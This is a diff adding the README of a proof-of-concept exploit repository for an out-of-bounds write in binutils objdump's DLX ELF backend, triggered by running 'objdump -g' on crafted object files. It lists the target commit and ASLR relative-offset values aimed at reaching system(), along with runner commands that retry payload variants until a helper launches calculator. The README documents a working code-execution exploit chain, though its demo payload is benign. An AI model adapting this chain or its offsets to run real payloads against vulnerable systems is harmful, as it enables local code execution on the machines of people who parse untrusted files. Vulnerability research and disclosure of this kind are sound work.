@@ -1,0 +1,124 @@
+# objdump dlx calc poc
+
+Small repro for an `objdump -g` crash-to-calc path in the DLX ELF backend.
+
+This is an ACE-style local parser bug: the input is a crafted ELF/DLX object file, and the trigger is running `objdump` on it. It is not a network RCE by itself. The demo payload starts the tiny helper named `P`, and that helper opens calculator.
+
+Tested against a binutils-gdb master build from commit:
+
+```text
+c311f4d37f31ff3fbb5db6923abcdf93bb75a37b
+```
+
+## whats in here
+
+- `payloads/*.bin` - crafted ELF/DLX object files to feed to `objdump`
+- `payloads/*.notes` - notes for each generated payload variant
+- `P` - helper script that writes `calc_hit.log` and starts Windows calculator from WSL
+- `run_dlx_calc_poc.sh` - tries the payload variants until one hits
+- `generate_objdump_dlx_calc_poc.py` - regenerates the payload variants
+- `dlx_chain_builder.py` - small builder used by the generator
+- `docs/aslr-bypass-analysis.md` - notes on why this is profile-dependent
+- `tools/search_pointer_transform.py` - Z3 sanity check for fixed pointer transforms
+
+The payload files are named `.bin` because they are raw binary files, but the file format inside is ELF/DLX.
+
+## why there are multiple payloads
+
+ASLR stays on. Because of that, one exact payload is not guaranteed to land every time. The files in `payloads/` are a small set of guesses for the address layout seen during testing.
+
+The generator emits the original profile plus a WSL/Ubuntu 24.04 profile measured against the pinned `dlx-elf` build. The second profile keeps ASLR on but uses stable relative offsets observed in the target process:
+
+```text
+layout=wsl2404 off_io=-0x3690 off_sec=0xbb0 rbase=0x220
+buf_delta=0x702fff00 or 0x6f300000
+system_delta=0x7042e500 or 0x7043e4ff
+```
+
+That is an ASLR-on relative-delta strategy, not a universal single-shot info-leak bypass. A miss can still happen, so the runner keeps the retry loop.
+
+More detail is in `docs/aslr-bypass-analysis.md`.
+
+So a plain crash like this does not always mean the PoC failed:
+
+```text
+Segmentation fault (core dumped)
+```
+
+The useful signal is either calculator opening, or `calc_hit.log` getting a fresh `CALC_HELPER_RAN ...` line.
+
+## quick run
+
+From WSL:
+
+```bash
+cd /path/to/objdump-dlx-calc-poc
+chmod +x P
+export PATH="$PWD:$PATH"
+MAX_TRIES=50 bash run_dlx_calc_poc.sh /path/to/objdump
+cat calc_hit.log
+```
+
+Example with a local binutils build:
+
+```bash
+MAX_TRIES=50 bash run_dlx_calc_poc.sh /opt/binutils-master/binutils/objdump
+```
+
+## manual run without the helper loop
+
+If you want to do the same thing by hand and keep ASLR on:
+
+```bash
+cd /path/to/objdump-dlx-calc-poc
+chmod +x P
+export PATH="$PWD:$PATH"
+rm -f calc_hit.log
+
+for p in payloads/*.bin; do
+  echo "$p"
+  /path/to/objdump -g "$p" >/dev/null 2>&1 || true
+  if [ -s calc_hit.log ]; then
+    echo "HIT $p"
+    cat calc_hit.log
+    break
+  fi
+done
+```
+
+Same thing as a one-liner:
+
+```bash
+rm -f calc_hit.log; for p in payloads/*.bin; do echo "$p"; /path/to/objdump -g "$p" >/dev/null 2>&1 || true; if [ -s calc_hit.log ]; then echo "HIT $p"; cat calc_hit.log; break; fi; done
+```
+
+## regenerating payloads
+
+```bash
+rm -rf payloads
+python3 generate_objdump_dlx_calc_poc.py --out-dir payloads
+```
+
+The runner will also regenerate `payloads/` automatically if the folder is missing or empty.
+
+## what the bug is doing
+
+At a high level, the crafted DLX object gives `objdump -g` relocation data that causes the DLX backend to write outside the intended debug section while processing relocations. The PoC shapes those writes so that, when the process layout lines up, control flow reaches the helper command `P`.
+
+That is why `PATH` matters. The helper is run by name, so this line is needed:
+
+```bash
+export PATH="$PWD:$PATH"
+```
+
+Without it, you can still get the segfault, but the helper might not be found.
+
+## cleanup
+
+Runtime files are not needed:
+
+```bash
+rm -f calc_hit.log objdump-poc.out
+```
+
+The generated crash after a hit is expected. The process usually does not exit cleanly after the helper is reached.
